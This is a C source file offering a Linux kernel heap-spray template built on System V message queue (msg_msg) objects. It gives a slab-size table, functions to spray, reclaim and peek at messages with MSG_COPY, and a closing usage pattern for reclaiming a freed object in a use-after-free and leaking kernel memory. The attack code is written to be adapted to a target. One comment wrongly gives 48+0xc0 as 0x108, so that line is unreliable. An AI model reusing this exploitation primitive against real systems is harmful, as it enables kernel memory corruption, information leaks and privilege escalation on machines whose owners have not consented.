/*
 * msg_msg Heap Spray Template
 *
 * struct msg_msg layout (48-byte header):
 *   0x00: struct list_head m_list  (16 bytes - next/prev pointers)
 *   0x10: long m_type              (8 bytes - message type, must be > 0)
 *   0x18: size_t m_ts              (8 bytes - total message size)
 *   0x20: struct msg_msgseg *next  (8 bytes - pointer to continuation)
 *   0x28: void *security           (8 bytes - LSM security pointer)
 *   0x30: [user data starts here]
 *
 * Allocation behavior:
 *   - Total alloc = 48 (header) + data_size
 *   - If data_size <= PAGE_SIZE - 48 (4048): single msg_msg in kmalloc-*
 *   - If data_size > 4048: msg_msg in kmalloc-4096 + msg_msgseg chain
 *   - msg_msgseg has 8-byte header (next pointer) + data
 *
 * Common sizes:
 *   kmalloc-64:   data_size = 1..16      (48+16=64)
 *   kmalloc-96:   data_size = 17..48     (48+48=96)
 *   kmalloc-128:  data_size = 49..80     (48+80=128)
 *   kmalloc-192:  data_size = 81..144    (48+144=192)
 *   kmalloc-256:  data_size = 145..208   (48+208=256)
 *   kmalloc-512:  data_size = 209..464   (48+464=512)
 *   kmalloc-1024: data_size = 465..976   (48+976=1024)
 *   kmalloc-2048: data_size = 977..2000  (48+2000=2048)
 *   kmalloc-4096: data_size = 2001..4048 (48+4048=4096)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <errno.h>

/* Adjust these for your target slab cache */
#define MSG_SPRAY_COUNT     0x200     /* Number of messages to spray */
#define MSG_QUEUE_COUNT     0x10      /* Number of message queues */
#define MSG_DATA_SIZE       0xc0      /* User data size (target kmalloc-256: 48+0xc0=0x108 -> 256) */
#define MSG_MTYPE_SPRAY     0x41      /* Message type for spray messages */
#define MSG_MTYPE_BARRIER   0x42      /* Message type for barrier messages */

struct spray_msg {
    long mtype;
    char mtext[MSG_DATA_SIZE];
};

static int msg_qids[MSG_QUEUE_COUNT];

/* Initialize message queues */
int spray_init_msgqueues(void) {
    for (int i = 0; i < MSG_QUEUE_COUNT; i++) {
        msg_qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msg_qids[i] < 0) {
            perror("msgget");
            return -1;
        }
    }
    return 0;
}

/* Spray msg_msg objects with controlled content */
int spray_msgsnd(void *payload, size_t payload_size, int count) {
    struct spray_msg msg;
    msg.mtype = MSG_MTYPE_SPRAY;

    if (payload && payload_size <= MSG_DATA_SIZE) {
        memset(msg.mtext, 0, MSG_DATA_SIZE);
        memcpy(msg.mtext, payload, payload_size);
    } else {
        memset(msg.mtext, 'A', MSG_DATA_SIZE);
    }

    for (int i = 0; i < count; i++) {
        int qid = msg_qids[i % MSG_QUEUE_COUNT];
        if (msgsnd(qid, &msg, MSG_DATA_SIZE, 0) < 0) {
            perror("msgsnd");
            return -1;
        }
    }
    return 0;
}

/* Read msg_msg without consuming (peek) - requires MSG_COPY */
int spray_msgrcv_peek(int qid_idx, void *buf, size_t size, long mtype) {
    /* MSG_COPY reads by index without removing the message.
     * Requires CONFIG_CHECKPOINT_RESTORE.
     * mtype is used as the index when MSG_COPY is set. */
    struct spray_msg msg;
    ssize_t ret = msgrcv(msg_qids[qid_idx], &msg, size, mtype,
                         IPC_NOWAIT | MSG_COPY);
    if (ret < 0) return -1;
    if (buf) memcpy(buf, msg.mtext, ret < (ssize_t)size ? ret : size);
    return ret;
}

/* Consume (free) a specific msg_msg */
int spray_msgrcv_free(int qid_idx, long mtype) {
    struct spray_msg msg;
    return msgrcv(msg_qids[qid_idx], &msg, MSG_DATA_SIZE, mtype, IPC_NOWAIT);
}

/* Free all messages in all queues */
void spray_cleanup(void) {
    for (int i = 0; i < MSG_QUEUE_COUNT; i++) {
        msgctl(msg_qids[i], IPC_RMID, NULL);
    }
}

/*
 * Usage pattern for exploit:
 *
 * 1. spray_init_msgqueues();
 * 2. spray_msgsnd(payload, sizeof(payload), MSG_SPRAY_COUNT);  // Fill slab
 * 3. // ... trigger vulnerability to free target object ...
 * 4. spray_msgsnd(evil_payload, sizeof(evil_payload), 1);      // Reclaim slot
 * 5. // ... trigger use of dangling pointer ...
 * 6. spray_msgrcv_peek(qid, leak_buf, size, idx);              // Leak data
 * 7. spray_cleanup();
 */
